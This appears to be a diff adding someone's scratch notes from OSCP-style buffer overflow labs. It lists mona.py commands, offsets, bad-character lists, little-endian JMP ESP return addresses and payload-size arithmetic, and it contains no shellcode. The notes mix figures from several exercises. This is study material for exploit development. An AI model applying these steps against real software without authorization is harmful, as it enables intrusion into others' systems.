@@ -1,0 +1,83 @@
+!mona commands:
+
+1. !mona config -set workingfolder c:\mona\%p
+
+2. !mona findmsp -distance 600
+
+3. !mona bytearray -b "\x00"
+
+4. !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+5. !mona bytearray -b "\x00\xbadchar"
+
+6. !mona jmp -r esp -cpb "\x00"
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+see: BOF tutorial by hacking article
+
+at 600 byte --> crashed   
+
+arbitary payload made --> 600 byte
+
+offset --> 537
+
+shellcode --> 351 byte
+
+
+Address	          Status                   BadChars
+0x0182fa30  Corruption after 6 bytes   00 a0 a1 ad ae be bf de df ef f0
+				       => \x00\xa0\xa1\xad\xae\xbe\xbf\xde\xdf\xef\xf0
+				       => \x00\xa0\xad\xbe\xde\xef    <---- Bad Char(probable)
+
+					(as bad char tends to corrupt next char as
+					 well that doesn't mean that adjucent char
+					  is bad char)  -> a1 ae bf df f0 should be victims
+ Type	    Location
+ normal      Stack
+
+
+ret addr: 
+
+0x625011af  => lSB --> \xaf\x11\x50\x62
+0x625011bb  => LSB --> \xbb\x11\x50\x62
+0x625011c7  => LSB --> \xc7\x11\x50\x62
+0x625011d3  => LSB --> \xd3\x11\x50\x62
+0x625011eb  => LSB --> \xeb\x11\x50\x62
+0x625011f7  => LSB --> \xf7\x11\x50\x62
+0x62501203  => LSB --> \x03\x12\x50\x62
+0x62501205  => LSB --> \x05\x12\x50\x62
+
+-----------------------------
+Eg:
+
+payload = 
+
+prefix + 1978 + 4 + 16 + 351 ---> 2349 + prefix --> 2349 + 10 --> 2359  (<= 2400)
+
+______________________________________________________________________
+
+
+at 2100 byte --> crashed
+
+payload made --> 2100 byte  
+
+-----> Technically, it would also work, to find the offset but if it was taken, 
+       making payload would be difficult.
+
+_____________
+Eg:
+
+kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 2000 -q 76413176
+[*] Exact match at offset 1274
+
+kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 2100 -q 76413176
+[*] Exact match at offset 1274
+------------
+
+offset --> 537  => min. byte to overflow buffer/stack
+
+crashed at --> 600 => offset present b/w 500 and 600 according to fuzzing script
+
+
+
+
